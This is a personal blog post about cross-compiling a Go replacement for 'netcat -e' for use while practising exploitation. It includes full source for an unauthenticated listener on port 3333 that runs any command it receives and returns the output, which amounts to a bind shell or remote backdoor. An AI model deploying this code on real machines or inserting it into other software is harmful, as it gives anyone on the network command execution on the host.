---
title: "GoCat and Remote Commands"
date: 2020-01-29T16:17:21-05:00
draft: false
tags:
  - security
  - code execution
  - go
---

This week at work, Daniel, a coworker, and I have been experimenting with replacing the usage of netcat for executing commands on a remote machine with a custom-built piece of software. Well, more specifically, Daniel ran into some issues with netcat, with the -e option, being absent from a machine that he was trying to exploit. (Don’t worry, it was for learning purposes and nothing malicious.) As a result, Daniel devised a simple replacement to a standalone netcat binary.
I started thinking though, “What happens if you needed to run that application on a computer that does not have Python installed?” Daniel had the same thought and decided to take a look into using pyinstaller to create binaries. I, however, was concerned about building for different platforms using pyinstaller because I have had some, let’s say, trouble with pyinstaller before. I wanted to build a similar project that was easily distributed among different platforms.

You know what does have a pretty good cross platform story? 

![Java Runs Everywhere](/blog/images/java-runs-everywhere.jpg)


I am joking! I could have used Java, but I am not excited about the development story. Moreover, if a system doesn’t have a JVM implementation, then we are back where we started with Python. So what other language or technology could I use to build a similar project to Daniel, but had easier portability.

It's Go time!

I have created some small projects using Go, but this seemed like a great place to leverage the cross compilation of Go binaries so that you can easily use the utility on different platforms. Using Daniel’s Python implementation, I gave a whack at building a similar utility in Go.

Below is the source:

```go
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

const (
	host           = "0.0.0.0"
	port           = "3333"
	connectionType = "tcp"
)

func main() {
	address := fmt.Sprintf("%s:%s", host, port)
	l, err := net.Listen(connectionType, address)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	defer l.Close()
	fmt.Printf("Listening on %s\n", address)
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		go handleRequest(conn)
	}
}

func handleRequest(conn net.Conn) {
	buf := make([]byte, 1024)
	_, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading: ", err.Error())
	}
	cmd, args := createCommand(buf)
	result, err := execute(cmd, args...)
	if err != nil {
		fmt.Println("Error Executing", err.Error())
	}
	conn.Write([]byte(result))
	conn.Close()
}

func createCommand(buffer []byte) (string, []string) {
	initial := strings.Trim(string(buffer), "\x00\n")
	parts := strings.Split(initial, " ")
	return parts[0], parts[1:]
}

func execute(command string, args ...string) (string, error) {
	cmd := exec.Command(command, args...)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	if err := cmd.Start(); err != nil {
		return "", err
	}
	buf := make([]byte, 1024)
	stdout.Read(buf)
	output := string(buf)

	if err := cmd.Wait(); err != nil {
		return "", err
	}
	return output, nil
}
```  

Now I realize there are some hardcoded values in the above source as well as some issues with robustness, but this was a first pass. The question is, “Are you now able to build the tool for different systems and have it work like you suspect?” To test that, I manually built the binaries for MacOS, Windows, and Linux machines. I handed those over for Daniel to test and he confirmed that each one worked as expected.

What realizations came from this exercise?

- Go does require more code than Python. However, I realized that from previous projects.
- Go is very easy to cross-compile and distribute for different platforms and architectures.
- Go may be a good replacement for Python when building security utilities because of the portability and rather robust standard library.
- If I were going to continue to work on this tool, then I would spend some time using it as is before making additional design decisions or changes. I see using command-line arguments to set the host and port for the tool, but that may be pointless complexity.

Now when I do make changes, I would like to automatically rebuild the project. Moreover, I would like to make those changes available to others relatively quickly. That is a discussion for another time, but I will tell you that **GitHub Actions** achieve my automation goal. Stayed tuned for more....

